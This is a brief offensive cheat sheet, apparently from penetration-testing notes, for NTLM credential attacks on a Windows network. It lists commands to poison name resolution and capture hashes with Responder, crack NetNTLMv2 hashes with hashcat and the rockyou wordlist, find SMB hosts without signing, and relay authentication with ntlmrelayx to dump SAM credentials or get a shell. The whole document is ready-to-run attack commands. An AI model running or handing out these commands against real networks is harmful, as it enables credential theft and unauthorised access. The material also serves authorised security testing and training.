```
# Capture (Responder):
sudo responder -I tun0 -wv
hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt

# Check signing:
nxc smb <SUBNET>/24 -u '' -p '' --gen-relay-list unsigned.txt

# Relay:
sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
# Trigger auth via UNC, link, etc. → SAM dump or shell
```